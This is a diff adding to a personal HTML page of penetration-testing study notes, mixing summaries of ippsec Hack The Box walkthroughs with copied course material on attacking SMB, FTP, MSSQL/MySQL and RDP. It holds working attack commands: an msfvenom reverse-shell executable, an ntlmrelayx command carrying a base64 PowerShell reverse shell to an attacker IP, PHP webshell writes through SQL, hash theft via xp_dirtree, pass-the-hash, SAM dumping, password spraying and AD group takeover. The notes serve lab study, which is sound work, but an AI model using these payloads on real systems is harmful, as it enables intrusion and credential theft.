@@ -1611,6 +1611,17 @@ https://www.exploit-db.com/exploits/15704
 <!-- 7 -->
 <h2 id="description"><a href="#description">My Notes</a></h2>
 
+
+<div class="github-dark">
+    <pre><code>
+---------------------------------------------------
+msfvenom -p windows/shell_reverse_tcp  LHOST=192.168.45.194  LPORT=1337  -f exe -e x86/shikata_ga_nai -i 10 --encrypt aes256 -x /usr/share/windows-binaries/plink.exe  -o runme.exe
+
+---------------------------------------------------
+    </code></pre>
+</div>
+
+
 <div class="github-dark">
     <pre><code>
 ---------------------------------------------------
@@ -1661,7 +1672,7 @@ he then relized maximum number of characters for url is 2 thousands and his file
     <pre><code>
 
 ---------------------------------------------------
-SSTI - enables you to execute commands and get reverse shell you will have to pop some error to get what marker being used to know what language the marker is using and 
+[*] SSTI - enables you to execute commands and get reverse shell you will have to pop some error to get what marker being used to know what language the marker is using and 
 search for a commands to execute shell you can use ${{<%[%'"}}%\
 ---------------------------------------------------
 - XSS - stored xss is like the vuln i found in the css api that injects whatever markup language and your script in the page  
@@ -2099,6 +2110,22 @@ But you need to be lucky that the other internal site in the same origin, or the
 
 <div class="github-dark">
     <pre><code>
+-------------------[Active Directory]--------------------------------
+========= 
+
+from this I understand that TGT  like certificate of the client is created by kerberos to always take the username and check it with the information inside the TGT so it is like freezing the state of the client at the creation time of the TGT and always checking the user and validating according to the TGT to know if he lies. and the TGS is exactly like the purpose of the TGT kerberos add the session key and all the information about that client in the TGT and encrypt with the service TGS so that the service can do exactly the same as what kerberos is doing which is taking what the client see himself is by decrypting the session and comparing it with the information previously the client defined himself by decrypting the TGS which is the information given by the kerberos is it correct
+
+
+
+================
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
 -------------------[Certificates]--------------------------------
 ========= 
 
@@ -2342,6 +2369,108 @@ log files will get put here
 
 <div class="github-dark">
     <pre><code>
+-------------------[ippsec Reel  ]--------------------------------
+- [*] when ippsec saw ssh in AD box he said openssh 7.6 this is a little bit odd because the ftp indicate its a windows box
+  because of Microsoft ftpd while openssh indicate it is linux box because it has ssh and normaly you don't have ssh in
+  in windows so his first though is maybe there's some type of vm technology
+- when he saw port 445 windows server 2012 R2 Standard 9600 he said it is latest release of windows 2012 which is not 
+  exploitable by eternal blue
+- [*] ippsec found smtp port 25 is open so he knew it is a kind of phishing challenge that lead to RCE
+- thus he knew he has to find an email which he found using exiftool on the .docx files
+- after he found an email he tested it on the smtp to validate if it is a real email
+- also he mentioned you can enumerate users using smtp you can rewatch for more info
+- this is a nice box for smtp to RCE
+- when ippsec had writeowner on a user he used set-DomainObjectOwner -Identity Herman -OwnerIdentity nico to create the owns link in bloodhound
+- then he executed Add-DomainObjectOwner -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose to 
+  create the ForceChangePassword link in bloodhound
+- then he changed the password of Herman with $pass = ConvertTo-SecureString 'PleaseSubscribe!' -AsPlainText -Force
+- and then  set-DomainUserPassword Herman -AccountPassword $pass -Verbose
+- however he said in real scenario you don't want to do this you want to allow reversable encryption or make it kerberoastable
+- then he added Herman to domain_admin as follows first he saw if herman is a domain admin using
+- Get-DomainGroup -MemberIdentity Herman | selectt samaccountname
+- $cred = New-Object System.Management.Automation.OSCredential('HTB/Herman',$pass)
+- Add-DomainMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
+- ippsec shared a veeeery important information about the .net  version and how to know which version for the box 
+  which used to cause me a lot of issues
+- Get-Item .\clr.dll | fl if this doesn't work then 
+- $file = Get-Item .\clr.dll then [System.Diagnostics.FileVersionInfo]::GetVersionInfo($file).FileVersion
+- damn it also contain 64/32 issues !
+- damn he got ride of the 64/32 issue by converting watson to dll !
+- then he did [Reflection.Assembly]::LoadFile("the dll")
+- then he tried [Watson.Program]::Main()
+- also he shows way to do the reverse shell using msfconsole much faster
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec ypuffy  ]--------------------------------
+- ippsesc mimic nmap scripts for ldapsearch which is very interesting reference for this skill to come back later
+- ippsec used smbmap to download after the -R command and so a file he wants
+  smbdump -u -p -H [IP] --download alice/my_private_key.ppk
+- [msfconsole] ippsec used ssh_enum on the box first used an invalid user and the msf replied invalid user when he used the list of users
+  it replied with the existing users so he said the ssh is vulnerable to the ssh user enumeration or CVE-2018-15473 when i searched
+- [*] ssh - enables you to ennumerate users on the box
+- when ippsec saw a database in the server and doubted there is a web services running even though the port scanning didn't show any pages in port 80 he checked /etc/httpd.conf 
+- ippsec said he learned from the box that there are two ways he knows to login using ssh and plus the third way he learned from this box
+- the keyboard auth which is typing the password
+- using ssh key that we provide
+- and the third using certificate authority so the ssh client will search when you give it a pub key ssearch for the - cert key and then if it has it
+  it sends
+- so what he did he generated root ssh keys using
+  ssh-keygen -f root
+- he then used the following command to sign this private key using his +s as ssh-keygen
+  doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I sometext root
+- the doas is like sudo but in openBSD
+- -s is for the ca private key 
+- -n is the principle name of the user root
+- root is the file name or private key
+- -I is key id which could be anything just to id
+- don't forgett chmod 777 [the directory where the root key recides]
+- also another interesting thing is how he knew the openbsd version from openssh version
+- it is like openssh 7.7 is on 2018 april 3 so of course openbsd release that is exactly before april 3 2018 will put
+  the latest version of openssh
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec Active  ]--------------------------------
+- ippsec said that once he see port 88 kerberos open he search for port 389 ldap
+- these port assumes he is in a AD box
+- we don't see any shares open and generally you should see shares on a domain controller like sysol at least 
+  listing them because he belive you have to have some anonymous shares open for AD to work or at least that's 
+  the default configuration
+- when he wanted to search for the nmap scripts he did
+  locate -r '\.nse$' then locate -r '\.nse$' | xargs grep categories to execute command on each
+- Groups.xml is a group policy file where local account informations is stored if you wanna push out a local admin
+  before windows 2012 people generally would do it in group policy 
+- microsoft has remove than ippsec doesn't know in 2012 or 2008
+- ippsec downloaded all the shares using 
+  smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q
+-  he said the equavilient of this command in smbclient is
+   smbclient //10.10.10.100/Replication
+   > recurse ON
+   > prompt OFF
+   > mget *
+- ippsec said after the GPP user he can't psexec because it is normal user 
+- be he said usually once he get a user he blood hound the box
+- however he does this in windows not linux
+- he then run runas /netonly /user:active.htb\svc_tgs cmd
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
 -------------------[ippsec querier  ]--------------------------------
 - ippsec usually do this way of scanning
 - nmap -p- -oN allports.nmap [ip]
@@ -2353,7 +2482,7 @@ log files will get put here
 - when he logged in he executed responder to steal mssql service creds using dir_tree command to lookup
   for unexisted shared and crack the ntlmv2 hash found in responder
 
-[*] ssql and any service running enable you to execute command - you can steal the service hash using responder to have access
+[*] for any port open ssql and any service running enable you to execute command - you can steal the service hash using responder to have access
 
 - ippsec showed us the meaning of responder skipping previously captured hash for ..
 - he told us there is a file called ersponder.db which we can sqlite3 responder.db
@@ -2363,7 +2492,18 @@ log files will get put here
 - he said if we have admin he would use psexec beecause he would be able to drop files into admin
 - the get out for me here is that psexec tool need access to ADMIN$
 - and responder can let you know what the service identitiy name it is running under in windows 
-
+- the very interesting thing is the user pass ippsec found enabled him to log in mssql using to mssqlclient.py
+- however he could't get use of the feature enable_xp_cmdshell which will shortcut the machine command line execution
+- but after cracking the service pass and logging in again to the service using the mssql-svc HE CAN !
+- however we know that mssql-svc doesn't have access to ADMIN$ so it is low priveledge account
+- the take away is that you might do the responder method to get the sesrvice account itself and there might be 
+  features enables you to execute commands in the system which will even be more stealthy way to execute system commands
+- when ippsec looked at systeminnfo and saw Microsoft Windows Server 2019 Standard, he said even if we have 
+  impersonation token it doesn't work on this version all of juicy/rotten etc potatos
+- ippsec also show a way to make vi give powershell scripts coloring and solve an issue for it to work which will be interesting reference
+  for later when i want to do it 
+- also ippsec explains how the powerup did the group policy decrypted the admin password that simply gave ippsec the password if admin you can check the full vid
+- you can find a tool that decrypt it manually like powerup searching python decrypt gpp
 ------------------------------------------------------------------------------------------------------------
 
 
@@ -2464,6 +2604,1721 @@ pulled from github where HTB boxes doesn't have access to enternet
     </code></pre>
 </div>
 
+<div class="github-dark">
+    <pre><code>
+-------------------[HTB collected]--------------------------------
+[ATTACKING COMMON SERVICES]
+
+
+- C:\htb> dir n: /a-d /s /b | find /c ":\"
+29302
+We found 29,302 files.
+- C:\htb>dir n:\*cred* /s /b
+n:\Contracts\private\credentials.txt
+C:\htb>dir n:\*secret* /s /b
+n:\Contracts\private\secret.txt
+- findstr /s /i cred n:\*.*
+- Get-ChildItem \\192.168.220.129\Finance\
+- New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
+- PS C:\htb> $username = 'plaintext'
+PS C:\htb> $password = 'Password123'
+PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
+PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
+- Windows PowerShell - GCI
+  PS C:\htb> N:
+  PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
+  29302
+- We can use the property -Include to find specific items from the directory specified by the Path     parameter.
+  Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
+- Windows PowerShell - Select-String
+  Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
+- Linux - Mount
+  sudo mkdir /mnt/Finance
+  sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
+- As an alternative, we can use a credential file.
+  mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
+
+The file credentialfile has to be structured like this:
+
+CredentialFile
+username=plaintext
+password=Password123
+domain=.
+
+Note: We need to install cifs-utils to connect to an SMB share folder. To install it we can execute from the command line sudo apt install cifs-utils.
+
+- Linux - Find
+  find /mnt/Finance/ -name *cred*
+  grep -rn /mnt/Finance/ -ie cred
+- Linux 
+- sqsh -S 10.129.20.13 -U username -P Password123
+- sqlcmd -S 10.129.20.13 -U username -P Password123
+- mysql -u username -pPassword123 -h 10.129.20.13
+- Windows - MySQL
+- mysql.exe -u username -pPassword123 -h 10.129.20.13
+
+Tools to Interact with Common Services:
+
+SMB:
+- smbclient
+- CrackMapExec
+- SMBMap
+- Impacket
+- psexec.py
+- smbexec.py
+
+FTP:
+- ftp
+- lftp
+- ncftp
+- filezilla
+- crossftp
+
+Email:
+- Thunderbird
+- Claws
+- Geary
+- MailSpring
+- mutt
+- mailutils
+- sendEmail
+- swaks
+- sendmail
+
+Databases:
+- mssql-cli
+- mycli
+- mssqlclient.py
+- dbeaver
+- MySQL Workbench
+- SQL Server Management Studio (SSMS)
+
+- sudo dpkg -i dbeaver-<version>.deb
+- dbeaver &
+
+Log4j
+The process of Log4j is to log the User-Agent as a string using a function and store it in the designated location. The vulnerability in this process is the misinterpretation of the string, which leads to the execution of a request instead of logging the events. However, before we go further into this function, we need to talk about privileges.
+
+Log4j
+What made the Log4j vulnerability so dangerous was the Privileges that the implementation brought. Logs are often considered sensitive because they can contain data about the service, the system itself, or even customers. Therefore, logs are usually stored in locations that no regular user should be able to access. Accordingly, most applications with the Log4j implementation were run with the privileges of an administrator. The process itself exploited the library by manipulating the User-Agent so that the process misinterpreted the source and led to the execution of user-supplied code.
+
+Log4j
+The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker, which in our case is the Destination in our concept of attacks. This query requests a Java class created by the attacker and is manipulated for its own purposes. The queried Java code inside the manipulated Java class gets executed in the same process, leading to a remote code execution (RCE) vulnerability.
+
+GovCERT.ch has created an excellent graphical representation of the Log4j vulnerability worth examining in detail.
+
+- Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/
+
+Initiation of the Attack
+Step	Log4j	Concept of Attacks - Category
+1.	The attacker manipulates the user agent with a JNDI lookup command.	Source
+2.	The process misinterprets the assigned user agent, leading to the execution of the command.	Process
+3.	The JNDI lookup command is executed with administrator privileges due to logging permissions.	Privileges
+4.	This JNDI lookup command points to the server created and prepared by the attacker, which contains a malicious Java class containing commands designed by the attacker.	Destination
+This is when the cycle starts all over again, but this time to gain remote access to the target system.
+
+Trigger Remote Code Execution
+Step	Log4j	Concept of Attacks - Category
+5.	After the malicious Java class is retrieved from the attacker's server, it is used as a source for further actions in the following process.	Source
+6.	Next, the malicious code of the Java class is read in, which in many cases has led to remote access to the system.	Process
+7.	The malicious code is executed with administrator privileges due to logging permissions.	Privileges
+8.	The code leads back over the network to the attacker with the functions that allow the attacker to control the system remotely.	Destination
+=======
+- medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
+==========
+[*] FTP Bounce Attack
+An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.
+
+The Nmap -b flag can be used to perform an FTP bounce attack:
+nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+
+Enumeration
+Nmap default scripts -sC includes the ftp-anon Nmap script which checks if a FTP server allows anonymous logins. The version enumeration flag -sV provides interesting information about FTP services, such as the FTP banner, which often includes the version name. We can use the ftp client or nc to interact with the FTP service. By default, FTP runs on TCP port 21.
+
+In this case, we will discuss the CoreFTP before build 727 vulnerability assigned CVE-2022-22836. This vulnerability is for an FTP service that does not correctly process the HTTP PUT request and leads to an authenticated directory/path traversal, and arbitrary file write vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.
+CoreFTP Exploitation
+  Latest FTP Vulnerabilities
+Viyky7@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+=============
+SMB & rpc
+
+[*] One recent significant vulnerability that affected the SMB protocol was called SMBGhost with the CVE-2020-0796. The vulnerability consisted of a compression mechanism of the version SMB v3.1.1 which made Windows 10 versions 1903 and 1909 vulnerable to attack by an unauthenticated attacker. The vulnerability allowed the attacker to gain remote code execution (RCE) and full access to the remote target system.
+
+The vulnerability occurs while processing a malformed compressed message after the Negotiate Protocol Responses. If the SMB server allows requests (over TCP/445), compression is generally supported, where the server and client set the terms of communication before the client sends any more data. Suppose the data transmitted exceeds the integer variable limits due to the excessive amount of data. In that case, these parts are written into the buffer, which leads to the overwriting of the subsequent CPU instructions and interrupts the process's normal or planned execution. These data sets can be structured so that the overwritten instructions are replaced with our own ones, and thus we force the CPU (and hence also the process) to perform other tasks and instructions.
+
+
+From the above example, the permissions are set to READ and WRITE, which one can use to upload and download the files.
+
+smbmap -H 10.129.14.128 --download "notes\note.txt"
+smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
+
+We can use the rpcclient tool with a null session to enumerate a workstation or Domain Controller.
+
+Viyky7@htb[/htb]$ rpcclient -U'%' 10.10.110.17
+
+rpcclient $> enumdomusers
+
+user:[mhope] rid:[0x641]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+
+Brute Forcing and Password Spray
+
+crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+
+Note: By default CME will exit after a successful login is found. Using the --continue-on-success flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option --local-auth. For a more detailed study Password Spraying see the Active Directory Enumeration & Attacks module.
+
+When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:
+
+Remote Command Execution
+Extract Hashes from SAM Database
+Enumerating Logged-on Users
+Pass-the-Hash (PTH)
+
+
+1. RCE
+PsExec is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a named pipe that can send commands to the system.
+
+
+Impacket PsExec - Python PsExec like functionality example using RemComSvc.
+Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
+Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
+CrackMapExec - includes an implementation of smbexec and atexec.
+Metasploit PsExec - Ruby PsExec implementation.
+
+impacket-psexec administrator:'Password123!'@10.10.110.17
+
+CrackMapExec
+Another tool we can use to run CMD or PowerShell is CrackMapExec. One advantage of CrackMapExec is the availability to run a command on multiples host at a time.
+crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+Note: If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec.
+
+Note: If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec.
+
+crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+
+Extract Hashes from SAM Database
+
+crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+
+Pass-the-Hash (PtH)
+
+crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+
+Forced Authentication Attacks
+Responder
+
+If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. Let us see an example using impacket-ntlmrelayx.
+
+First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
+cat /etc/responder/Responder.conf | grep 'SMB ='
+
+Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.
+
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
+
+We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).
+
+Viyky7@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
+==============================================
+SQL database
+By default, MSSQL uses ports TCP/1433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a "hidden" mode, it uses the TCP/2433 port. We can use Nmap's default scripts -sC option to enumerate database services on a target system:
+
+[*] In the past, there was a vulnerability CVE-2012-2122 in MySQL 5.6.x servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the timing attack vulnerability existed in the way MySQL handled authentication attempts.
+In this timing attack, MySQL repeatedly attempts to authenticate to a server and measures the time it takes for the server to respond to each attempt. By measuring the time it takes the server to respond, we can determine when the correct password has been found, even if the server does not indicate success or failure.
+
+sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+
+1> xp_cmdshell 'whoami'
+2> GO
+
+output
++-----------------------------
+no service\mssql$sqlexpress
+NULL
+(2 rows affected)
+
+1> SELECT name FROM master.dbo.sysdatabases
+2> GO
+
+name
++--------------------------------------------------
+master
+tempdb
+model
+msdb
+htbusers
+
+[*] Write Local Files
+MySQL does not have a stored procedure like xp_cmdshell, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose MySQL operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using SELECT INTO OUTFILE in the webserver directory. Then we can browse to the location where the file is and execute our commands.
+
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.
+
+secure_file_priv may be set as follows:
+
+If empty, the variable has no effect, which is not a secure setting.
+If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
+If set to NULL, the server disables import and export operations.
+In the following example, we can see the secure_file_priv variable is empty, which means we can read and write data using MySQL:
+
+show variables like "secure_file_priv";
+
+MSSQL - Enable Ole Automation Procedures
+To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
+1> sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> sp_configure 'Ole Automation Procedures', 1
+6> GO
+7> RECONFIGURE
+8> GO
+
+[*] MSSQL - Create a File
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+
+[*] Read Local Files
+By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
+
+[*] Read Local Files in MSSQL
+  Attacking SQL Databases
+1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2> GO
+
+As we previously mentioned, by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
+
+MySQL - Read Local Files in MySQL
+  Attacking SQL Databases
+mysql> select LOAD_FILE("/etc/passwd");
+
+Capture MSSQL Service Hash
+XP_DIRTREE Hash Stealing
+  Attacking SQL Databases
+1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+2> GO
+
+and 
+
+XP_SUBDIRS Hash Stealing
+  Attacking SQL Databases
+1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+2> GO
+
+XP_SUBDIRS Hash Stealing with Responder
+sudo responder -I tun0
+
+XP_SUBDIRS Hash Stealing with impacket
+sudo impacket-smbserver share ./ -smb2support
+
+[*] Impersonate Existing Users with MSSQL
+
+SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the IMPERSONATE privilege can lead to privilege escalation in SQL Server.
+
+First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:
+
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+
+name
+-----------------------------------------------
+sa
+ben
+valentin
+To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+
+-----------
+julio                                                                                                                    
+
+(1 rows affected)
+
+-----------
+          0
+
+(1 rows affected)
+
+As the returned value 0 indicates, we do not have the sysadmin role, but we can impersonate the sa user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement EXECUTE AS LOGIN and set it to the user we want to impersonate.
+Impersonating the SA User
+
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+
+-----------
+sa
+
+(1 rows affected)
+
+-----------
+          1
+
+(1 rows affected)
+
+Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.
+
+We can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement REVERT.
+
+after that ippsec executed 
+
+[*] Communicate with Other Databases with MSSQL
+
+If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.
+
+Identify linked Servers in MSSQL
+  Attacking SQL Databases
+1> SELECT srvname, isremote FROM sysservers
+2> GO
+
+srvname                             isremote
+----------------------------------- --------
+DESKTOP-MFERMN4\SQLEXPRESS          1
+10.0.0.12\SQLEXPRESS                0
+
+(2 rows affected)
+
+As we can see in the query's output, we have the name of the server and the column isremote, where 1 means is a remote server, and 0 is a linked server. We can see sysservers Transact-SQL for more information.
+
+1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+2> GO
+
+------------------------------ ------------------------------ ------------------------------ -----------
+DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
+
+(1 rows affected)
+
+Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
+
+This section covered some of the most common ways to attack SQL Server and MySQL databases during penetration testing engagements. There are other methods for attacking these database types as well as others, such as PostGreSQL, SQLite, Oracle, Firebase, and MongoDB which will be covered in other modules. It is worth taking some time to read up on these database technologies and some of the common ways to attack them as well.
+
+===============
+RDP
+
+[*] In 2019, a critical vulnerability was published in the RDP (TCP/3389) service that also led to remote code execution (RCE) with the identifier CVE-2019-0708. This vulnerability is known as BlueKeep. It does not require prior access to the system to exploit the service for our purposes. However, the exploitation of this vulnerability led and still leads to many malware or ransomware attacks. Large organizations such as hospitals, whose software is only designed for specific versions and libraries, are particularly vulnerable to such attacks, as infrastructure maintenance is costly. Here, too, we will not go into minute detail about this vulnerability but rather keep the focus on the concept.
+
+The vulnerability is also based, as with SMB, on manipulated requests sent to the targeted service. However, the dangerous thing here is that the vulnerability does not require user authentication to be triggered. Instead, the vulnerability occurs after initializing the connection when basic settings are exchanged between client and server. This is known as a Use-After-Free (UAF) technique that uses freed memory to execute arbitrary code.
+Not all newer Windows variants are vulnerable to Bluekeep, according to Microsoft. Security updates for current Windows versions are available, and Microsoft has also provided updates for many older Windows versions that are no longer supported. Nevertheless, 950,000 Windows systems were identified as vulnerable to Bluekeep attacks in an initial scan in May 2019, and even today, about a quarter of those hosts are still vulnerable.
+
+
+Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration.
+
+Using the Crowbar tool, we can perform a password spraying attack against the RDP service. 
+crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+
+Hydra - RDP Password Spraying
+hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+
+Protocol Specific Attacks
+Let's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.
+
+RDP Session Hijacking
+
